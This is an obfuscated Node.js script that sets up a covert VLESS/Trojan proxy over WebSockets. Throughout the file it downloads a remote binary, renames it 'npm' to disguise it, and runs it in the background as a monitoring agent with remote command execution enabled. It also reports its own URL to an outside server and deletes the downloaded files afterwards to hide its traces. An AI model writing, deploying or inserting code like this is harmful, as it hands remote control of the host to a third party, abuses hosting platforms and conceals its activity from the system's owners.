const _0x32199f=_0x189b;function _0x189b(_0x11ff72,_0x5096ac){const _0x22e565=_0x22e5();return _0x189b=function(_0x189bd6,_0x5417f0){_0x189bd6=_0x189bd6-0x82;let _0x481ed7=_0x22e565[_0x189bd6];return _0x481ed7;},_0x189b(_0x11ff72,_0x5096ac);}(function(_0x3dbeb8,_0x1b4255){const _0x345100=_0x189b,_0x26f153=_0x3dbeb8();while(!![]){try{const _0xbf59c1=-parseInt(_0x345100(0xbf))/0x1*(parseInt(_0x345100(0x8f))/0x2)+-parseInt(_0x345100(0xa7))/0x3*(parseInt(_0x345100(0xd9))/0x4)+parseInt(_0x345100(0xab))/0x5+parseInt(_0x345100(0xa0))/0x6+parseInt(_0x345100(0x92))/0x7+-parseInt(_0x345100(0xce))/0x8*(parseInt(_0x345100(0xb3))/0x9)+-parseInt(_0x345100(0xc5))/0xa*(parseInt(_0x345100(0xf3))/0xb);if(_0xbf59c1===_0x1b4255)break;else _0x26f153['push'](_0x26f153['shift']());}catch(_0x39b3ce){_0x26f153['push'](_0x26f153['shift']());}}}(_0x22e5,0x87351));const os=require('os'),http=require(_0x32199f(0xc6)),fs=require('fs'),axios=require(_0x32199f(0x87)),net=require(_0x32199f(0xcc)),path=require(_0x32199f(0xe9)),crypto=require(_0x32199f(0xa4)),{Buffer}=require(_0x32199f(0xba)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x32199f(0xdc)][_0x32199f(0x85)]||'4f470dcb-2df7-43fd-b701-8ee19c1aa5b1',NEZHA_SERVER=process[_0x32199f(0xdc)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x32199f(0xdc)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x32199f(0xdc)][_0x32199f(0xe2)]||'',DOMAIN=process[_0x32199f(0xdc)][_0x32199f(0x96)]||_0x32199f(0xd6),AUTO_ACCESS=process[_0x32199f(0xdc)][_0x32199f(0xa2)]||!![],WSPATH=process[_0x32199f(0xdc)][_0x32199f(0xe3)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x32199f(0xdc)][_0x32199f(0x8a)]||_0x32199f(0xc0),NAME=process['env'][_0x32199f(0xb4)]||_0x32199f(0xe6),PORT=process['env'][_0x32199f(0x83)]||0x1eb4;let ISP='';function _0x22e5(){const _0x52dba4=['readUInt8','PORT','8.8.4.4','UUID','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','axios','writeFileSync','then','SUB_PATH','asOrganization','Failed\x20to\x20resolve\x20','connect','update','2lyInhU','1.1.1.1','concat','7389809jvQzDg',':443?encryption=none&security=tls&sni=','country','config.yaml','DOMAIN','utf8','data','error','map','\x20-p\x20','find','base64','length','&path=%2F','5604948lyLWFN','message','AUTO_ACCESS','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','crypto','sha224','npm\x20download\x20successfully','3rEgPOS','join','8443','Automatic\x20Access\x20Task\x20added\x20successfully','4126390GWHYrW','log','2083','Server','false','aarch64','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20running','9FjdYfK','NAME','from','vless://','catch','test','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','buffer','get','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','writeHead','write','235491IIKndp','sub','setsid\x20nohup\x20./npm\x20-s\x20','decode','slice','listen','1025510mlRkCk','http','includes','npm\x20running\x20error:','Status','text/plain','toString','net','substr','6234104zUpzUS','arm','https://amd64.ssss.nyc.mn/v1','url','createHash','end','send','true','1234.abc.com','Answer','pipe','884200wJlRgR','https://arm64.ssss.nyc.mn/v1','hex','env','2053','post','Not\x20Found\x0a','readUInt16BE','utf-8','NEZHA_KEY','WSPATH',':443?security=tls&sni=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Hug','&fp=chrome&type=ws&host=','reduce','path','every','type','text/html','readFile','split','trojan://','replace','https://arm64.ssss.nyc.mn/agent','close','110PcgPVd','pop'];_0x22e5=function(){return _0x52dba4;};return _0x22e5();}const GetISP=async()=>{const _0x377216=_0x32199f;try{const _0x22bad9=await axios['get']('https://speed.cloudflare.com/meta'),_0x1ceb44=_0x22bad9[_0x377216(0x98)];ISP=(_0x1ceb44[_0x377216(0x94)]+'-'+_0x1ceb44[_0x377216(0x8b)])[_0x377216(0xf0)](/ /g,'_');}catch(_0x286162){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x131518,_0x406222)=>{const _0x15b592=_0x32199f;if(_0x131518[_0x15b592(0xd1)]==='/'){const _0x2cb165=path[_0x15b592(0xa8)](__dirname,'index.html');fs[_0x15b592(0xed)](_0x2cb165,_0x15b592(0x97),(_0x53b3d4,_0x2bf547)=>{const _0x57da2b=_0x15b592;if(_0x53b3d4){_0x406222[_0x57da2b(0xbd)](0xc8,{'Content-Type':_0x57da2b(0xec)}),_0x406222[_0x57da2b(0xd3)]('Hello\x20world!');return;}_0x406222[_0x57da2b(0xbd)](0xc8,{'Content-Type':_0x57da2b(0xec)}),_0x406222[_0x57da2b(0xd3)](_0x2bf547);});return;}else{if(_0x131518[_0x15b592(0xd1)]==='/'+SUB_PATH){const _0x202b90=_0x15b592(0xb6)+UUID+'@'+DOMAIN+_0x15b592(0x93)+DOMAIN+_0x15b592(0xe7)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x536b13=_0x15b592(0xef)+UUID+'@'+DOMAIN+_0x15b592(0xe4)+DOMAIN+_0x15b592(0xe7)+DOMAIN+_0x15b592(0x9f)+WSPATH+'#'+NAME+'-'+ISP,_0x239593=_0x202b90+'\x0a'+_0x536b13,_0x5a8f2d=Buffer[_0x15b592(0xb5)](_0x239593)[_0x15b592(0xcb)](_0x15b592(0x9d));_0x406222[_0x15b592(0xbd)](0xc8,{'Content-Type':_0x15b592(0xca)}),_0x406222[_0x15b592(0xd3)](_0x5a8f2d+'\x0a');}else _0x406222[_0x15b592(0xbd)](0x194,{'Content-Type':_0x15b592(0xca)}),_0x406222[_0x15b592(0xd3)](_0x15b592(0xdf));}}),wss=new WebSocket[(_0x32199f(0xae))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x32199f(0x84),_0x32199f(0x90)];function resolveHost(_0x5247cd){return new Promise((_0x1e1a11,_0x1b3f63)=>{const _0x2c872a=_0x189b;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2c872a(0xb8)](_0x5247cd)){_0x1e1a11(_0x5247cd);return;}let _0x148480=0x0;function _0x360f2d(){const _0x5aec88=_0x2c872a;if(_0x148480>=DNS_SERVERS['length']){_0x1b3f63(new Error(_0x5aec88(0x8c)+_0x5247cd+_0x5aec88(0xb1)));return;}const _0x1bed8b=DNS_SERVERS[_0x148480];_0x148480++;const _0x1a8869='https://dns.google/resolve?name='+encodeURIComponent(_0x5247cd)+'&type=A';axios[_0x5aec88(0xbb)](_0x1a8869,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x6e6e71=>{const _0x4e44cd=_0x5aec88,_0x1d6066=_0x6e6e71[_0x4e44cd(0x98)];if(_0x1d6066[_0x4e44cd(0xc9)]===0x0&&_0x1d6066['Answer']&&_0x1d6066['Answer']['length']>0x0){const _0x32f83a=_0x1d6066[_0x4e44cd(0xd7)][_0x4e44cd(0x9c)](_0x20447b=>_0x20447b[_0x4e44cd(0xeb)]===0x1);if(_0x32f83a){_0x1e1a11(_0x32f83a['data']);return;}}_0x360f2d();})[_0x5aec88(0xb7)](_0x18a893=>{_0x360f2d();});}_0x360f2d();});}function handleVlessConnection(_0x48d085,_0x123b7d){const _0x5b2844=_0x32199f,[_0x17bdda]=_0x123b7d,_0x1d0212=_0x123b7d['slice'](0x1,0x11);if(!_0x1d0212[_0x5b2844(0xea)]((_0x3b1a82,_0x5b5e42)=>_0x3b1a82==parseInt(uuid['substr'](_0x5b5e42*0x2,0x2),0x10)))return![];let _0x48326e=_0x123b7d['slice'](0x11,0x12)[_0x5b2844(0x82)]()+0x13;const _0x2e14c1=_0x123b7d[_0x5b2844(0xc3)](_0x48326e,_0x48326e+=0x2)[_0x5b2844(0xe0)](0x0),_0x3f24ab=_0x123b7d[_0x5b2844(0xc3)](_0x48326e,_0x48326e+=0x1)[_0x5b2844(0x82)](),_0x27a6d4=_0x3f24ab==0x1?_0x123b7d[_0x5b2844(0xc3)](_0x48326e,_0x48326e+=0x4)[_0x5b2844(0xa8)]('.'):_0x3f24ab==0x2?new TextDecoder()[_0x5b2844(0xc2)](_0x123b7d['slice'](_0x48326e+0x1,_0x48326e+=0x1+_0x123b7d[_0x5b2844(0xc3)](_0x48326e,_0x48326e+0x1)[_0x5b2844(0x82)]())):_0x3f24ab==0x3?_0x123b7d['slice'](_0x48326e,_0x48326e+=0x10)[_0x5b2844(0xe8)]((_0x49224b,_0x1942e5,_0x8ecf4d,_0x2b8c78)=>_0x8ecf4d%0x2?_0x49224b['concat'](_0x2b8c78[_0x5b2844(0xc3)](_0x8ecf4d-0x1,_0x8ecf4d+0x1)):_0x49224b,[])[_0x5b2844(0x9a)](_0x51da24=>_0x51da24[_0x5b2844(0xe0)](0x0)[_0x5b2844(0xcb)](0x10))['join'](':'):'';_0x48d085[_0x5b2844(0xd4)](new Uint8Array([_0x17bdda,0x0]));const _0x394fa6=createWebSocketStream(_0x48d085);return resolveHost(_0x27a6d4)[_0x5b2844(0x89)](_0x1ca27a=>{const _0x137454=_0x5b2844;net['connect']({'host':_0x1ca27a,'port':_0x2e14c1},function(){const _0x2707e8=_0x189b;this['write'](_0x123b7d[_0x2707e8(0xc3)](_0x48326e)),_0x394fa6['on'](_0x2707e8(0x99),()=>{})[_0x2707e8(0xd8)](this)['on'](_0x2707e8(0x99),()=>{})['pipe'](_0x394fa6);})['on'](_0x137454(0x99),()=>{});})[_0x5b2844(0xb7)](_0x1f1c4a=>{const _0xe259f=_0x5b2844;net[_0xe259f(0x8d)]({'host':_0x27a6d4,'port':_0x2e14c1},function(){const _0x834511=_0xe259f;this[_0x834511(0xbe)](_0x123b7d['slice'](_0x48326e)),_0x394fa6['on'](_0x834511(0x99),()=>{})[_0x834511(0xd8)](this)['on'](_0x834511(0x99),()=>{})[_0x834511(0xd8)](_0x394fa6);})['on'](_0xe259f(0x99),()=>{});}),!![];}function handleTrojanConnection(_0x1d078e,_0x33f69f){const _0x184229=_0x32199f;try{if(_0x33f69f[_0x184229(0x9e)]<0x3a)return![];const _0x40ee0c=_0x33f69f[_0x184229(0xc3)](0x0,0x38)[_0x184229(0xcb)](),_0x16e9c1=[UUID];let _0x28dcad=null;for(const _0x321836 of _0x16e9c1){const _0x441d33=crypto[_0x184229(0xd2)](_0x184229(0xa5))[_0x184229(0x8e)](_0x321836)['digest'](_0x184229(0xdb));if(_0x441d33===_0x40ee0c){_0x28dcad=_0x321836;break;}}if(!_0x28dcad)return![];let _0x206898=0x38;_0x33f69f[_0x206898]===0xd&&_0x33f69f[_0x206898+0x1]===0xa&&(_0x206898+=0x2);const _0x10d675=_0x33f69f[_0x206898];if(_0x10d675!==0x1)return![];_0x206898+=0x1;const _0x5b6a5a=_0x33f69f[_0x206898];_0x206898+=0x1;let _0x592e46,_0x53d5da;if(_0x5b6a5a===0x1)_0x592e46=_0x33f69f['slice'](_0x206898,_0x206898+0x4)[_0x184229(0xa8)]('.'),_0x206898+=0x4;else{if(_0x5b6a5a===0x3){const _0x3edd70=_0x33f69f[_0x206898];_0x206898+=0x1,_0x592e46=_0x33f69f[_0x184229(0xc3)](_0x206898,_0x206898+_0x3edd70)[_0x184229(0xcb)](),_0x206898+=_0x3edd70;}else{if(_0x5b6a5a===0x4)_0x592e46=_0x33f69f[_0x184229(0xc3)](_0x206898,_0x206898+0x10)['reduce']((_0x370e55,_0xfea27d,_0x392ec8,_0xd1ec5f)=>_0x392ec8%0x2?_0x370e55[_0x184229(0x91)](_0xd1ec5f['slice'](_0x392ec8-0x1,_0x392ec8+0x1)):_0x370e55,[])[_0x184229(0x9a)](_0x2d1f01=>_0x2d1f01[_0x184229(0xe0)](0x0)['toString'](0x10))[_0x184229(0xa8)](':'),_0x206898+=0x10;else return![];}}_0x53d5da=_0x33f69f[_0x184229(0xe0)](_0x206898),_0x206898+=0x2;_0x206898<_0x33f69f['length']&&_0x33f69f[_0x206898]===0xd&&_0x33f69f[_0x206898+0x1]===0xa&&(_0x206898+=0x2);const _0x2b07f5=createWebSocketStream(_0x1d078e);return resolveHost(_0x592e46)[_0x184229(0x89)](_0x99a247=>{const _0x2a0dd8=_0x184229;net[_0x2a0dd8(0x8d)]({'host':_0x99a247,'port':_0x53d5da},function(){const _0x758e32=_0x2a0dd8;_0x206898<_0x33f69f[_0x758e32(0x9e)]&&this[_0x758e32(0xbe)](_0x33f69f['slice'](_0x206898)),_0x2b07f5['on'](_0x758e32(0x99),()=>{})['pipe'](this)['on'](_0x758e32(0x99),()=>{})['pipe'](_0x2b07f5);})['on'](_0x2a0dd8(0x99),()=>{});})[_0x184229(0xb7)](_0xded60d=>{const _0x3e247a=_0x184229;net[_0x3e247a(0x8d)]({'host':_0x592e46,'port':_0x53d5da},function(){const _0x201cc8=_0x3e247a;_0x206898<_0x33f69f['length']&&this[_0x201cc8(0xbe)](_0x33f69f['slice'](_0x206898)),_0x2b07f5['on'](_0x201cc8(0x99),()=>{})[_0x201cc8(0xd8)](this)['on'](_0x201cc8(0x99),()=>{})[_0x201cc8(0xd8)](_0x2b07f5);})['on'](_0x3e247a(0x99),()=>{});}),!![];}catch(_0x49bbaa){return![];}}wss['on']('connection',(_0x74a994,_0x10145c)=>{const _0x5d9f5a=_0x32199f,_0xe06268=_0x10145c[_0x5d9f5a(0xd1)]||'';_0x74a994['once'](_0x5d9f5a(0xa1),_0x241913=>{const _0x246542=_0x5d9f5a;if(_0x241913[_0x246542(0x9e)]>0x11&&_0x241913[0x0]===0x0){const _0x46fd5b=_0x241913[_0x246542(0xc3)](0x1,0x11),_0x4a773e=_0x46fd5b['every']((_0xfdd7f2,_0x4fcdbe)=>_0xfdd7f2==parseInt(uuid[_0x246542(0xcd)](_0x4fcdbe*0x2,0x2),0x10));if(_0x4a773e){!handleVlessConnection(_0x74a994,_0x241913)&&_0x74a994[_0x246542(0xf2)]();return;}}!handleTrojanConnection(_0x74a994,_0x241913)&&_0x74a994[_0x246542(0xf2)]();})['on'](_0x5d9f5a(0x99),()=>{});});const getDownloadUrl=()=>{const _0x44135d=_0x32199f,_0xfa924e=os['arch']();return _0xfa924e===_0x44135d(0xcf)||_0xfa924e==='arm64'||_0xfa924e===_0x44135d(0xb0)?!NEZHA_PORT?_0x44135d(0xda):_0x44135d(0xf1):!NEZHA_PORT?_0x44135d(0xd0):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x22bc21=_0x32199f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x176cea=getDownloadUrl(),_0x5e6e2c=await axios({'method':_0x22bc21(0xbb),'url':_0x176cea,'responseType':'stream'}),_0x1366b9=fs['createWriteStream']('npm');return _0x5e6e2c[_0x22bc21(0x98)]['pipe'](_0x1366b9),new Promise((_0x2b5563,_0x90e4db)=>{const _0x24a318=_0x22bc21;_0x1366b9['on']('finish',()=>{const _0x517b72=_0x189b;console[_0x517b72(0xac)](_0x517b72(0xa6)),exec('chmod\x20+x\x20npm',_0x526579=>{if(_0x526579)_0x90e4db(_0x526579);_0x2b5563();});}),_0x1366b9['on'](_0x24a318(0x99),_0x90e4db);});}catch(_0x53ab70){throw _0x53ab70;}},runnz=async()=>{const _0x152b4b=_0x32199f;try{const _0x189736=execSync(_0x152b4b(0x86),{'encoding':_0x152b4b(0xe1)});if(_0x189736['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x746999){}await downloadFile();let _0x78a56a='',_0x1669a1=['443',_0x152b4b(0xa9),'2096','2087',_0x152b4b(0xad),_0x152b4b(0xdd)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x333287=_0x1669a1['includes'](NEZHA_PORT)?'--tls':'';_0x78a56a=_0x152b4b(0xc1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x152b4b(0x9b)+NEZHA_KEY+'\x20'+_0x333287+_0x152b4b(0xe5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x588337=NEZHA_SERVER[_0x152b4b(0xc7)](':')?NEZHA_SERVER[_0x152b4b(0xee)](':')[_0x152b4b(0xf4)]():'',_0x28aecb=_0x1669a1[_0x152b4b(0xc7)](_0x588337)?_0x152b4b(0xd5):_0x152b4b(0xaf),_0x2f5bf1='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x152b4b(0xb9)+_0x28aecb+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x152b4b(0x88)](_0x152b4b(0x95),_0x2f5bf1);}_0x78a56a=_0x152b4b(0xbc);}else{console['log'](_0x152b4b(0xa3));return;}}try{exec(_0x78a56a,{'shell':'/bin/bash'},_0x58a5ea=>{const _0x249b70=_0x152b4b;if(_0x58a5ea)console[_0x249b70(0x99)](_0x249b70(0xc8),_0x58a5ea);else console[_0x249b70(0xac)](_0x249b70(0xb2));});}catch(_0x546bfe){console[_0x152b4b(0x99)]('error:\x20'+_0x546bfe);}};async function addAccessTask(){const _0x8f1fee=_0x32199f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x366c98='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x355d19=await axios[_0x8f1fee(0xde)]('https://oooo.serv00.net/add-url',{'url':_0x366c98},{'headers':{'Content-Type':'application/json'}});console[_0x8f1fee(0xac)](_0x8f1fee(0xaa));}catch(_0x493f23){}}const delFiles=()=>{const _0x322b7c=_0x32199f;fs['unlink']('npm',()=>{}),fs['unlink'](_0x322b7c(0x95),()=>{});};httpServer[_0x32199f(0xc4)](PORT,()=>{const _0x34c0fe=_0x32199f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x34c0fe(0xac)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
